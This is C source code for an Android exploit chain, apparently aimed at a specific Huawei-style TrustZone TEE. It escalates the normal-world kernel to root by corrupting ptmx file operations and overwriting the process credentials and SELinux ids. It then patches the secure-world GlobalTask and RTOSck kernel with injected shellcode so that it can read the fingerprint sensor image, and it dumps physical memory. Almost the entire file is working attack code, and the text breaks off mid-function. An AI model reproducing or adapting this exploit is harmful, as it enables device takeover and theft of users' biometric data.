#include <string.h>
#include <jni.h>
#include <android/log.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <asm/ptrace.h>
#include <asm/user.h>
#include <asm/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <linux/elf.h>
#include <linux/reboot.h>
#include <errno.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <linux/ptrace.h>
#include <linux/prctl.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <termios.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mount.h>

#include "tc.h"
#include "kernel.h"
#include "ping.h"
#include "tee_client_id.h"
#define PATH_MAX 260


#define KERNEL_VIRT_ADDRESS     0xc0000000
#define MAPPED_BASE             0x20000000
#define KERNEL_SIZE             0x02000000

static int kernel_phys_offset_initialized = 0;
static unsigned long kernel_phys_offset = 0;

int g_shellcode = 0;

int TEE_shellcode();
int TEE_shellcode3();
#define  TC_NS_SMC 0xc08a4434
typedef unsigned int  (*fnTC_NS_SMC)(unsigned int);
#define  PTMX_DEVICE  "/dev/ptmx"
#define PTMX_FOPS 0xc1498e44

void hexdump(void *_data, unsigned int len)
{
unsigned char *data = (unsigned char*)_data;
unsigned count;

for (count = 0; count < len; count++) {
if ((count & 15) == 0)
fprintf(stderr,"%04x:", count);
fprintf(stderr," %02x %c", *data,
(*data < 32) || (*data > 126) ? '.' : *data);
data++;
if ((count & 15) == 15)
fprintf(stderr,"\n");
}
if ((count & 15) != 0)
fprintf(stderr,"\n");
}

static int
run_obtain_root_privilege()
{
  int fd;
  int ret;

  prctl(PR_SET_NAME, "ihoo.darkytools", 0, 0, 0);
  fd = open(PTMX_DEVICE, O_WRONLY);
  if(fd<=0){perror("ptmx open");return -1;}
  ret = fsync(fd);

  if(ret<0)
	  perror("ptmx sync");
  close(fd);


  return ret;
}

 int open_session(int fd,TC_NS_ClientContext *pcontext){

	 pcontext->paramTypes = TEEC_PARAM_TYPES(TEEC_NONE,TEEC_NONE,TEEC_NONE,TEEC_NONE);

	 		int i = 0;
	 		int bufflen = 0x100000;

	 		memset(pcontext,0,sizeof(TC_NS_ClientContext));
	 		pcontext->cmd_id = GLOBAL_CMD_ID_OPEN_SESSION;
	 		pcontext->started = 0;

	 		int ret = ioctl(fd,TC_NS_CLIENT_IOCTL_SES_OPEN_REQ,pcontext);
	 		if(ret<0) {perror("open_session");printf("open_session %d\n",ret);return ret;};

	 		printf("client_context.return 0x%p\n",pcontext->returns.code);
	 		printf("client_context.session_id 0x%p\n",pcontext->session_id);

	 		if(pcontext->returns.code!=0)
	 		{
	 			return pcontext->returns.code;
	 		}

	 return 0;
 }



int get_time(int fd,TC_NS_ClientContext *pcontext,int* pva,int* pvb){

		//check time
		//int va=0;
		//int vb = 0;
		pcontext->paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_NONE,TEEC_NONE,TEEC_NONE);
		pcontext->cmd_id = GLOBAL_CMD_ID_TEE_TIME;
		pcontext->params[0].value.a_addr = pva;
		pcontext->params[0].value.b_addr = pvb;
		pcontext->started = 0;

		int ret = ioctl(fd,TC_NS_CLIENT_IOCTL_SEND_CMD_REQ,pcontext);
		if(ret<0) {perror("ioctl");printf("%d\n",ret);return ret;};

		printf("client_context.return %p\n",pcontext->returns.code);
		printf("client_context.session_id %p\n",pcontext->session_id);
		printf("va %p,vb %p\n",*pva,*pvb);
error_exit:

        return pcontext->returns.code;
}


int crash_kernel2(int fd,TC_NS_ClientContext *pcontext){

	//check time


	pcontext->paramTypes = TEEC_PARAM_TYPES(TEE_PARAM_TYPE_VALUE_OUTPUT,TEEC_NONE,TEEC_NONE,TEEC_NONE);
	pcontext->cmd_id = GLOBAL_CMD_ID_TEE_TIME;
	pcontext->params[0].value.a_addr = PTMX_FOPS + 15*4;//+ 14*4;//0xc063f04c;//mapped_address;
	pcontext->params[0].value.b_addr =  PTMX_FOPS + 14*4;
	pcontext->started = 0;

	 int ret = ioctl(fd,TC_NS_CLIENT_IOCTL_SEND_CMD_REQ,pcontext);
	if(ret<0) {perror("ioctl");printf("%d\n",ret);};

	printf("client_context.return %p\n",pcontext->returns.code);
	printf("client_context.session_id %p\n",pcontext->session_id);
	//printf("va %p,vb %p\n",*(int*)mapped_address,size);
error_exit:

    return pcontext->returns.code;
}

int  kmemcmp(char *a1, char *a2, int len)
{
  int v3; // r3@2
  int v4; // r4@3
  int v5; // r5@3
  int result; // r0@4

  if ( len )
  {
    v3 = 0;
    while ( 1 )
    {
      v4 = a1[v3];
      v5 = a2[v3];
      if ( v4 != v5 )
        break;
      if ( a1[v3] )
      {
        ++v3;
        if ( len != v3 )
          continue;
      }
      goto LABEL_7;
    }
    result = v4 - v5;
  }
  else
  {
LABEL_7:
    result = 0;
  }
  return result;
}



typedef unsigned int  (*fnTC_NS_SMC)(unsigned int);
typedef unsigned int  (*fnTC_NS_SMC_Call)(TC_NS_ClientContext *, /*TC_NS_DEV_File **/int,unsigned int);
typedef int (*fnTC_NS_ClientOpen_from_kernel)(unsigned int *dev_file_count);
typedef int (*fnTC_NS_OpenSession_from_kernel)(unsigned int dev_id, void* argp);
typedef  int (*fnTC_NS_ClientIoctl_from_kernel)(unsigned int dev_id ,unsigned int cmd, void* argp);

typedef unsigned int  (*fnmutex_lock)(unsigned int);
typedef unsigned int  (*fnmutex_unlock)(unsigned int);
typedef unsigned int  (*fnTC_NS_store_exception_info)();
typedef void* (*fnkmalloc)(size_t size, int flags);


#define TC_NS_SMC 0xc08a4434
#define ptr_TC_NS_ClientOpen_from_kernel 0xc08a68a0
#define ptr_TC_NS_OpenSession_from_kernel 0xc08a6350
#define ptr_TC_NS_ClientIoctl_from_kernel 0xc08a820c
#define ptr_mutex_lock 0xc0ea1cd4
#define ptr_mutex_unlock 0xc0ea1a70
#define ptr_TC_NS_store_exception_info 0xc08a3bfc
#define prt_printk  0xc0e993a8
#define ptr_kmalloc 0xc06ef490
#define ptr_TC_NS_alloc_exception_mem 0xc08a73e0
//c06ef490 T __kmalloc
//c08a3bfc t TC_NS_store_exception_info


//c0ea1cd4 T mutex_lock
//c0ea1a70 T mutex_unlock
//c132b6d0 d smc_lock
#define SMC_LOCK 0xc132b6d0

fnTC_NS_SMC  tc_call =  TC_NS_SMC;
fnTC_NS_ClientOpen_from_kernel tc_open = ptr_TC_NS_ClientOpen_from_kernel;
fnTC_NS_OpenSession_from_kernel tc_open_session = ptr_TC_NS_OpenSession_from_kernel;
fnTC_NS_ClientIoctl_from_kernel tc_ioctl = ptr_TC_NS_ClientIoctl_from_kernel;
fnmutex_lock mutex_lock  = ptr_mutex_lock;
fnmutex_unlock mutex_unlock = ptr_mutex_unlock;
fnTC_NS_store_exception_info store_exception = ptr_TC_NS_store_exception_info;
fnPrintk printk = prt_printk;
fnkmalloc kmalloc = ptr_kmalloc;
fnTC_NS_OpenSession_from_kernel tc_alloc_exp_mem = ptr_TC_NS_alloc_exception_mem;

static int TC_NS_map_memory_to_TEE(unsigned int dev_id, unsigned int agent_id,unsigned int physmem,unsigned int size)
{
    TC_NS_SMC_CMD smc_cmd = {0};
    unsigned int smc_cmd_phys;
    int ret;
    unsigned char uuid[17] = {0};
    void *exception_mem;
    TC_NS_Operation operation = {0};

    fnTC_NS_SMC  tc_call =  TC_NS_SMC;
    fnTC_NS_ClientOpen_from_kernel tc_open = ptr_TC_NS_ClientOpen_from_kernel;
    fnTC_NS_OpenSession_from_kernel tc_open_session = ptr_TC_NS_OpenSession_from_kernel;
    fnTC_NS_ClientIoctl_from_kernel tc_ioctl = ptr_TC_NS_ClientIoctl_from_kernel;
    fnmutex_lock mutex_lock  = ptr_mutex_lock;
    fnmutex_unlock mutex_unlock = ptr_mutex_unlock;
    fnTC_NS_store_exception_info store_exception = ptr_TC_NS_store_exception_info;
    fnPrintk printk = prt_printk;
    fnkmalloc kmalloc = ptr_kmalloc;
    fnTC_NS_OpenSession_from_kernel tc_alloc_exp_mem = ptr_TC_NS_alloc_exception_mem;

    uuid[0] = 1;
    smc_cmd.uuid_phys = virt_to_phys(uuid);
    smc_cmd.cmd_id = GLOBAL_CMD_ID_REGISTER_NOTIFY_MEMORY;

    operation.paramTypes = TEE_PARAM_TYPE_VALUE_INPUT;
    operation.paramTypes = operation.paramTypes << 12;
    operation.params[0].value.a= physmem;
    operation.params[0].value.b = size;

    smc_cmd.operation_phys = virt_to_phys(&operation);

    smc_cmd_phys = virt_to_phys(&smc_cmd);

    mutex_lock(SMC_LOCK);
    ret = tc_call(smc_cmd_phys);
    mutex_unlock(SMC_LOCK);

//error:
    return ret;
}

static int TC_NS_alloc_exception_mem(unsigned int dev_id, unsigned int agent_id,unsigned int physmem,unsigned int size)
{
    TC_NS_SMC_CMD smc_cmd = {0};
    unsigned int smc_cmd_phys;
    int ret;
    unsigned char uuid[17] = {0};
    void *exception_mem;
    TC_NS_Operation operation = {0};

    fnTC_NS_SMC  tc_call =  TC_NS_SMC;
    fnTC_NS_ClientOpen_from_kernel tc_open = ptr_TC_NS_ClientOpen_from_kernel;
    fnTC_NS_OpenSession_from_kernel tc_open_session = ptr_TC_NS_OpenSession_from_kernel;
    fnTC_NS_ClientIoctl_from_kernel tc_ioctl = ptr_TC_NS_ClientIoctl_from_kernel;
    fnmutex_lock mutex_lock  = ptr_mutex_lock;
    fnmutex_unlock mutex_unlock = ptr_mutex_unlock;
    fnTC_NS_store_exception_info store_exception = ptr_TC_NS_store_exception_info;
    fnPrintk printk = prt_printk;
    fnkmalloc kmalloc = ptr_kmalloc;
    fnTC_NS_OpenSession_from_kernel tc_alloc_exp_mem = ptr_TC_NS_alloc_exception_mem;

    //memset(&smc_cmd, 0, sizeof(TC_NS_SMC_CMD));
    uuid[0] = 1;
    smc_cmd.uuid_phys = virt_to_phys(uuid);// (unsigned int)uuid + 0x81000000;
    smc_cmd.cmd_id = GLOBAL_CMD_ID_ALLOC_EXCEPTION_MEM;

    operation.paramTypes = TEE_PARAM_TYPE_VALUE_INPUT;
    operation.paramTypes = operation.paramTypes << 12;
    operation.params[0].value.a= physmem;
    operation.params[0].value.b = size;

    smc_cmd.operation_phys = virt_to_phys(&operation);//(unsigned int)&operation + 0x81000000;//virt_to_phys(&operation);

    smc_cmd_phys = virt_to_phys(&smc_cmd);//(unsigned int)&smc_cmd  + 0x81000000;

    mutex_lock(SMC_LOCK);
    ret = tc_call(smc_cmd_phys);
    mutex_unlock(SMC_LOCK);

//error:
    return ret;
}

char* kmalloc_shellcode(char* function_ptr,int size){

	char* buff = kmalloc(0x1000,0x80d0);
	char* src = function_ptr;//TC_NS_alloc_exception_mem;
	int i;
	for(i=0;i<size;i++){
		buff[i] = src[i];
	}

	return buff;

}



/**
 * send malformed SMC request to patch TA_GlobalTask
 *
 * try to patch alloc_exception_memory
 *
 *
int get_sys_time()
{
  int result; // r0@1
  tag_TC_NS_Operation *v1; // r3@1
  unsigned int v2; // [sp+0h] [bp-10h]@1
  int v3; // [sp+4h] [bp-Ch]@1

  get_sys_rtc_time((int)&v2);
  result = 0;
  v1 = dword_5E2E0->operation_phys;
  v1->params[0].memref.buffer = v2;   <-- write 4 byte at operation_phys + 4
  v1->params[0].memref.size = 1000 * v3;   <-- write 4 byte at operation_phys + 8
  return result;
}

v2 is second time from TEE startup

the last byte of v2 will be circle from 0x00 to 0xFF

so I can patch one byte to TA_Globaltask at a right second

 *
 */
unsigned int  send_TC_smd(int first_install){
	unsigned char uuid[17] = {0};
    void* cmd_phys;
    TC_NS_SMC_CMD cmd={0};
    TC_NS_Operation operation = {0};
    TC_NS_ClientContext client_contex = {0};

    int ret;

    char * puuid = kmalloc(17,0x80D0);
    TC_NS_SMC_CMD* pcmd = kmalloc(sizeof(TC_NS_SMC_CMD),0x80D0);
    TC_NS_Operation* poperation = kmalloc(sizeof(TC_NS_Operation),0x80D0);

    memset(puuid,0,17);
    memset(pcmd,0,sizeof(TC_NS_SMC_CMD));
    memset(poperation,0,sizeof(TC_NS_Operation));



    //=  tc_call(cmd_phys);
    int fd;
    ret = tc_open(&fd);
    if(0 == ret){
    	//test to crack TA2
    	//client_contex
    	client_contex.cmd_id = GLOBAL_CMD_ID_BOOT_ACK;
    	client_contex.paramTypes = TEEC_PARAM_TYPES(TEEC_NONE,TEEC_NONE,TEEC_NONE,TEEC_NONE);

    	//memset(&client_contex.uuid,0x02,16);
    	ret = tc_open_session(fd,&client_contex);
    	printk("tc_open_session ret=%p\n",ret);

    }
    else
    	return 0x9527;

	int va,vb;

    if(ret == 0){

    	void* shellcode = 0;
    	void* shellcode_phy = 0;

		if(first_install){
			ret = TC_NS_alloc_exception_mem(0,0,0x3FE79000,0x2000);
			printk("TC_NS_alloc_exception_mem ret=%p\n",ret);

	        puuid[0] = 1;
	        pcmd->cmd_id = GLOBAL_CMD_ID_TEE_TIME;
	        pcmd->uuid_phys = virt_to_phys((void*)puuid);

	        poperation->paramTypes = TEEC_PARAM_TYPES(TEEC_NONE,TEEC_NONE,TEEC_NONE,TEEC_NONE);
	        poperation->params[0].value.a = 0;
	        poperation->params[0].value.b = 0;

	        pcmd->operation_phys = virt_to_phys((void*)poperation);
	        pcmd->dev_file_id = fd;
	    	pcmd->context_id = 0;//client_contex.session_id;
	    	pcmd->started = 0;
	    	pcmd->login_data = client_contex.login.mdata;
	    	pcmd->login_method = client_contex.login.method;
	        cmd_phys = virt_to_phys((void*)pcmd);

	    	printk("cmd_phys %p,uuid %p,operation phys %p,pv_offset %p,valuea %p\n",cmd_phys,virt_to_phys((void*)puuid),virt_to_phys((void*)poperation),*(int*)0xc08a7480);

	    	//sys_call alloc exception memory
	    	//int attack_ptr = 0x2e101eb0;
	    	int attack_ptr = 0x2E104B34;
	    	int step = 0;
	    	char last_value = 0;
	    	//goto crash;
	    	do{


	    		//get time  000000xx xxxxxxxx
	    		pcmd->operation_phys = virt_to_phys(poperation); //attack_ptr + step;//virt_to_phys(0xc060eae8);//
	        	mutex_lock(SMC_LOCK);
	        	ret = tc_call(cmd_phys);
	        	mutex_unlock(SMC_LOCK);

	        	if(last_value!= (char)poperation->params[0].value.a)
	        		printk("step = %d,time = %p\n",step,(char)poperation->params[0].value.a);
	        	last_value = (char)poperation->params[0].value.a;

	    		switch(step){

	    			//1E FF 2F E1  BX LR
	    			//10 ff 2f e1  bx r0
	    			//11 FF 2F E1 BX R1
	    			case 0:
	    				if((char)poperation->params[0].value.a  == 0x10){
	    			        pcmd->operation_phys = attack_ptr + step;//virt_to_phys(0xc060eae8);//
	    		        	mutex_lock(SMC_LOCK);
	    		        	ret = tc_call(cmd_phys);
	    		        	mutex_unlock(SMC_LOCK);
	    		        	printk("step %d ret = %d",step,ret);
	    					step++;
	    				}
	    				break;
	    			case 1:
	    				if((char)poperation->params[0].value.a  == 0xFF){
	    			        pcmd->operation_phys = attack_ptr + step;//virt_to_phys(0xc060eae8);//
	    		        	mutex_lock(SMC_LOCK);
	    		        	ret = tc_call(cmd_phys);
	    		        	mutex_unlock(SMC_LOCK);
	    		        	printk("step %d ret = %d",step,ret);
	    					step++;
	    				}
	    				break;
	    			case 2:
	    				if((char)poperation->params[0].value.a  == 0x2F){
	    			        pcmd->operation_phys = attack_ptr + step;//virt_to_phys(0xc060eae8);//
	    		        	mutex_lock(SMC_LOCK);
	    		        	ret = tc_call(cmd_phys);
	    		        	mutex_unlock(SMC_LOCK);
	    		        	printk("step %d ret = %d",step,ret);
	    					step++;
	    				}
	    				break;
	    			case 3:
	    				if((char)poperation->params[0].value.a  == 0xe1){
	    			        pcmd->operation_phys = attack_ptr + step;//virt_to_phys(0xc060eae8);//
	    		        	mutex_lock(SMC_LOCK);
	    		        	ret = tc_call(cmd_phys);
	    		        	mutex_unlock(SMC_LOCK);
	    		        	printk("step %d ret = %d\n",step,ret);

	    					step++;
	    				}
	    				break;
	    			default:
	    				break;

	    		}

	    	}while(step<4);

	        shellcode = kmalloc_shellcode(TEE_shellcode3,0x1000);
	        shellcode_phy = virt_to_phys((void*)shellcode);

	        //0x2EF4C8A0
	        ret = TC_NS_map_memory_to_TEE(0,0,0x2EF4C000,0x1000);
	       	printk("TC_NS_map_memory_to_TEE return %x\n",ret);

	        ret = TC_NS_map_memory_to_TEE(0,0,shellcode_phy,0x1000);
	    	printk("TC_NS_map_memory_to_TEE return %x\n shellcode %x\n   shellcode physical addr %x\n",ret,shellcode,shellcode_phy);
		}else
		{
			shellcode = g_shellcode;
			shellcode_phy = virt_to_phys((void*)shellcode);
		}


    	int*dst = shellcode;
    	int i = 0;
    	for(i = 0;i<0x100;i++){
    		if(dst[i]==0xeeeeeeee){

    			char* buff = &dst[i];
    			buff+=24;
    			char* src = TC_shellcode;//TC_NS_alloc_exception_mem;
    			int i;
    			for(i=0;i<0x400;i++){
    				buff[i] = src[i];
    			}
    			break;
    		}
    	}


    	//trigger
    	ret = TC_NS_alloc_exception_mem(0,0,shellcode_phy,0x1000);
    	printk("shellcode return %x\n",ret);

    }else
    	return 0x9528;


    return ret;

}
typedef int (*fnTEE_OpenPersistentObject)(int storageID, void *objectID,
				    int objectIDLen, int flags,
				    void *object);
typedef int (*fns_fopen)(char* path,int mode);
typedef int (*fns_faccess)(char* path,int mode);

typedef int (*fnfile_name_transfer)(char* in,char* out,int flag);
typedef int (*fntee_init)(int* unknown);
typedef int (*fn__FPC_readImage)(int* unknown);
typedef int (*fn_rtos_memwrite)(int* unknown,int* un2);


/*
rtos_mem_write

Arbitrary RTOSck memory overwrite vulnerability

signed int __fastcall sys_call_c090(int a1, int a2)
{
  signed int v2; // r3@2
  int v4; // [sp+0h] [bp-14h]@1
  int v5; // [sp+4h] [bp-10h]@1

  v5 = a1;
  v4 = a2;
      if ( *(_DWORD *)a1 == 0x13579BDF )
      {

          *(_WORD *)v4 = (unsigned int)(*(_DWORD *)(v5 + 0x18C) + 7) >> 3;
          return 0;

      }
      else
      {
        v2 = 15729691;
      }
  return v2;
}

TC_shellcode  patch RTOSck kernel by sys_call_c090, then call __FPC_readImage to read FP image

*/

void TC_shellcode(){
	fns_fopen  s_fopen = 0x2E109750;
	fns_faccess s_faccess = 0x2E108380;
	fnfile_name_transfer file_name_transfer = 0x2E105F10;

	fntee_init tee_init = 0x2E11BE8C;
	fn__FPC_readImage __FPC_readImage = 0x2E102210;

	fn_rtos_memwrite rtos_mem_write = 0x2E102500;
	//fnTEE_OpenPersistentObject TEE_OpenPersistentObject = 0x2E1163B8;
	int* ret_buffer = (int*)SHARE_MEMORY;
	int ret;
	//int object_handle = 0;
	//int ret = TEE_OpenPersistentObject(1,ret_buffer,0x69,1,&object_handle);

	//*(int*)(0x2E15E3D0)  = SHARE_MEMORY+0x100;
	//int ret = s_fopen(ret_buffer,1);
	//int ret = file_name_transfer(ret_buffer,SHARE_MEMORY+0x200,1);
/*
	int ret = tee_init(SHARE_MEMORY+0x300);
	ret_buffer[0] = 0x5f636573;
	ret_buffer[1] = 0x726f7473;
	ret_buffer[2] = 0x2f656761;
	ret_buffer[3] = 0x5f6c6c61;
	ret_buffer[4] = 0x656a626f;
	ret_buffer[5] = 0x69667463;
	ret_buffer[6] = 0x656c;

	//ret = file_name_transfer(ret_buffer,SHARE_MEMORY+0x200,0);

	ret = s_fopen(ret_buffer,1);
	ret_buffer[0] = ret;
*/

	//patch __FPC_readImage
	ret_buffer[0] =  0x13579BDF;
	*(int*)((int)ret_buffer+0x18c) = 0;

	//write 0000
	ret = rtos_mem_write(ret_buffer,(int)0x2EF4C8A0);
	ret_buffer[2] = ret;

	//write ea30
	*(int*)((int)ret_buffer+0x18c) = 0x71CF9;
	ret = rtos_mem_write(ret_buffer,(int)0x2EF4C8A0+2);
	ret_buffer[2] = ret;

	//patch task_patch
	//*(int*)0x2EF4C8A0 = 0xe3a00000;

	//ret_buffer[10] = *(int*)0x2EF4C8A0;

	ret_buffer[3] = SHARE_MEMORY;
	ret_buffer[0] = __FPC_readImage(ret_buffer);
	return;

}
int TEEKOpenSession(){
	TC_NS_ClientContext context = {0};
	context.cmd_id = GLOBAL_CMD_ID_OPEN_SESSION;
	context.paramTypes = TEEC_PARAM_TYPES(TEEC_NONE,TEEC_NONE,TEEC_NONE,TEEC_NONE);

    return TC_NS_SMC_Call(&context, 0x0, 1);
}


//a simple ret2user trick
int MyCommitCred(int ruid, int rgid, signed int a3, int isSelinux)
{

        int v38; // [sp+0h] [bp-60h]@1
        int addrBase;
        char szName[16] = "ihoo.darkytools";
        int offset;
        mycred *my_cred;
        mycred *my_real_cred;
        struct task_security_struct * tsec;
        int ret = -1;

        int searchLenth;

        isSelinux = 1;
        //return 0;
        addrBase = *(int*)(((int)(&v38) & 0xFFFFE000) + 0xC);
        //return addrBase;
        if ( addrBase > 0xBFFFFFFF )
        {

          offset = 0;
          while ( 1 )
          {
            addrBase += 4;
            if ( !kmemcmp(addrBase, szName, 16) )
              break;
            ++offset;
            if ( offset == 0x600 )
            {
              return 18;
            }
          }
        }
        else
                return 17;

        my_cred = *(int*)(addrBase -8);
        my_real_cred = *(int*)(addrBase -8 - 4);



        searchLenth = 0;
        while(searchLenth<0x20){


                        if(!my_cred || !my_real_cred
                                        || my_cred<0xBFFFFFFF || my_real_cred<0xBFFFFFFF
                                       ){
                                        //2.6?

                                        addrBase-=4;


                                        my_cred = *(int*)(addrBase-8 );
                                        my_real_cred = *(int*)(addrBase -8-4);

                        }
                        else
                                break;

                        searchLenth++;
        }

        if(searchLenth == 0x20)
                return 0X20;
                // fuck!! where is my cred???

        //second time
        //
        if(my_cred->uid == 0){

            if(g_shellcode!=0){
            	//run second time
                return send_TC_smd(0);
            }else
            	return send_TC_smd(1);
        }

        my_cred->uid = 0;
        my_cred->gid = 0;
        my_cred->suid = 0;
        my_cred->sgid = 0;
        my_cred->egid = 0;
        my_cred->euid = 0;
        my_cred->fsgid = 0;
        my_cred->fsuid = 0;
        my_cred->securebits=0;
        my_cred->cap_bset.cap[0] = -1;
        my_cred->cap_bset.cap[1] = -1;
        my_cred->cap_inheritable.cap[0] = -1;
        my_cred->cap_inheritable.cap[1] = -1;
        my_cred->cap_permitted.cap[0] = -1;
        my_cred->cap_permitted.cap[1] = -1;
        my_cred->cap_effective.cap[0] = -1;
        my_cred->cap_effective.cap[1] = -1;

        //return my_cred;

/*
        my_real_cred->uid = 0;
        my_real_cred->gid = 0;
        my_real_cred->suid = 0;
        my_real_cred->sgid = 0;
        my_real_cred->egid = 0;
        my_real_cred->euid = 0;
        my_real_cred->fsgid = 0;
        my_real_cred->fsuid = 0;
        my_real_cred->securebits=0;
        my_real_cred->cap_bset.cap[0] = -1;
        my_real_cred->cap_bset.cap[1] = -1;
        my_real_cred->cap_inheritable.cap[0] = -1;
        my_real_cred->cap_inheritable.cap[1] = -1;
        my_real_cred->cap_permitted.cap[0] = -1;
        my_real_cred->cap_permitted.cap[1] = -1;
        my_real_cred->cap_effective.cap[0] = -1;
        my_real_cred->cap_effective.cap[1] = -1;
*/

        if(isSelinux){

                        tsec = my_cred->security;

                        if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;

                                        ret = 15;
                        }
                        else {
                                        tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_cred->security));

                                        if(tsec && tsec > 0xBFFFFFFF){
                                                                            tsec->sid = 1;
                                                                            tsec->exec_sid = 1;

                                                                            ret = 15;
                                                            }
                        }


                        tsec = my_real_cred->security;

                        if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;

                                        ret = 15;
                        }else {
                                        tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_real_cred->security));

                                        if(tsec && tsec > 0xBFFFFFFF){
                                                                            tsec->sid = 1;
                                                                            tsec->exec_sid = 1;

                                                                            ret = 15;
                                                            }
                        }



        }
        else{
                        ret = 16;
        }
        //printk("return %d",ret);



        return ret;
}

void shell_code2();

//    	printk("physical 0xe59f1b7c %p",*(int*)phys_to_virt(0xe59f1b7c));

int dump_phymem(char* filename,int virtaddr,int size){
	int outfd = open(filename, O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IROTH);
	if( outfd == -1 ) {
		printf("can't create output file %s\n", filename);
		goto out_1;
	}

	write(outfd, virtaddr,size);

	close(outfd);

	return 0;
out_1:
	return -1;
}

void* map_phymem(int phy_addr,int size){
	int mem_fd = open("/dev/mem",O_RDWR);
	printf("readmem enter %d  %p\n",mem_fd,phy_addr&0xfffff000);

	void* ptr = -1;
	ptr = mmap(NULL,size,PROT_READ|PROT_WRITE,MAP_PRIVATE,mem_fd,phy_addr&0xfffff000);

	if(ptr!= -1 && ptr!= 0){
		printf("mmap ptr = %p\n",ptr);
		printf("mmap *ptr = %p\n",*(int*)ptr);

		//getchar();
	}else{
		perror("mmap");
	}

	printf("readmem end\n");
	return ptr;
}




/*
 *	usage:
 *	./main  - exploit Linux kernel, exploit TEE_GlobalTask and exploit RTOSck(kernel of TEE).
 *			  call __FPC_readImage to read fingerprint image.
 *
 *  ./main  physical_addr  - dump physical memory from /dev/mem,  for debugging only
 *
 *  ./main 0 kernel_addr - run TEE shell code at  kernel_addr, for debugging only
 *
 *  ./main 0 0 0 0 - read TEE error log at 0x3FE01400(physical addr), for debugging only
 * */

int main(int argc, char *argv[])
{

	   int fd;
	   int ret;

	   if(argc==2){
		   goto debugging;
	   }else if(argc==3)
	   {
		   //second time to run exploit

			g_shellcode = strtoul(argv[2], 0, 16);

	   }else if(argc==4)
		   goto readlog;

	   fd = open(TC_NS_CLIENT_DEV_NAME, O_RDWR);
		if (fd < 0) {
		  goto error_exit;
	   }

		TC_NS_ClientContext client_context;
		memset(&client_context,0,sizeof(TC_NS_ClientContext));

		ret = open_session(fd,&client_context);
		if(ret!=0) {
			  goto error_exit;
		   }
		int va,vb;
		ret = get_time(fd,&client_context,&va,&vb);
		//ret = get_time(fd,&client_context);
		ret = crash_kernel2(fd,&client_context);


		printf("vb = %p\n",vb);
        void* addr = mmap(vb&0xfffff000,0x400000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,-1,0);
        printf("mmap return %p \n",addr);

        int times = 0x400000 / 4;
        int* addr_array = (int*)addr;

        int j;
        for(j=0;j<times;j++){
        	addr_array[j] = 0xE1a00000;
        }

        void* addr_shellcode = addr + 0x5000;

        *(int*)addr_shellcode =  0xE3500000;
        *((int*)((int)addr_shellcode+4)) = 0xe1a0f00e;
        memcpy(addr_shellcode,shell_code2,400);

        int* arr = (int*)addr_shellcode;
        int i;
        for(i=0;i<10;i++){
        	if(arr[i] == 0xeeeeeeee)
        		arr[i] = (int)MyCommitCred;
        }

        //第一次调用，获取root权限 /  gain root
		ret = run_obtain_root_privilege();

		printf("FIRST run_obtain_root_privilege %p\n",ret);

		printf("uid = %d\n",getuid());

		/*	物理地址 / special physical memory addr：
		 * 0x3fe00000  一段两个世界都可访问的共享内存区  / shared memory
		 *
		 * 0x2efb0000 TEE Level 1 pagetable addr
		 *
		 * 0x3fe7942b 崩溃时会有页表拷贝过来  / level 1 pagetable copied here when TA crashed
		 *
		 * 0x3fe79400  被我注册用来拷贝崩溃堆栈 / I register here for TEE register infomation when TA crashed
		 *
		 * 0x3FE01400 TEE RTOSck log buffer addr
		 *
		 * */




		//第二次进入内核触发smc调用  / execute kernel code to send SMC request
		//blx r1写入到 TEEGlobalTask alloc_exception_memory 系统调用  / patch 4 bytes to alloc_exeception_mem

		/*
ROM:2E104B18 alloc_exeception_mem                    ; CODE XREF: main:loc_2E100358p
ROM:2E104B18                 STMFD           SP!, {R3-R5,LR}
ROM:2E104B1C                 LDR             R3, =(dword_2E15CFC0 - 0x2E104B28)
ROM:2E104B20                 LDR             R3, [PC,R3] ; dword_2E15CFC0
ROM:2E104B24                 LDR             R3, [R3,#0x10]
ROM:2E104B28                 LDR             R3, [R3,#0x14]
ROM:2E104B2C                 LDR             R5, [R3,#4]
ROM:2E104B30                 LDR             R4, [R3,#8]
ROM:2E104B34                 MOV             R0, R5  ; int  <-----  change to "BX R4"
ROM:2E104B38                 MOV             R1, R4  ; int
ROM:2E104B3C                 BL              map_memory
ROM:2E104B40                 MOV             R0, R5
ROM:2E104B44                 MOV             R1, R4
ROM:2E104B48                 LDMFD           SP!, {R3-R5,LR}
ROM:2E104B4C                 B               syscall_f084
ROM:2E104B4C ; End of function alloc_exeception_mem
		 *
		 *
		 *
		 * */
		ret = run_obtain_root_privilege();

		printf("SEC run_obtain_root_privilege %p\n",ret);

		int* phy_map =  map_phymem(SHARE_MEMORY,0x7000);//map_phymem(0x3FE79400,0x4000);

		hexdump(phy_map,0x6400);

		if(phy_map!=-1)
			dump_phymem("/data/local/tmp/phydump",(int)phy_map,0x6400);

		//system("/system/bin/sh");
error_exit:
	return 0;

	int input_addr;
	int* phy_mapd;
debugging:

	input_addr = strtoul(argv[1], 0, 16);

	phy_mapd =  map_phymem(input_addr,0x1000);//map_phymem(0x3FE79400,0x4000);

	hexdump(phy_mapd,0x1000);

	if(phy_mapd!=-1)
		dump_phymem("/data/local/tmp/phydump",(int)phy_mapd,0x1000);
   	return 0;
readlog:
	//input_addr = strtoul(argv[3], 0, 16);

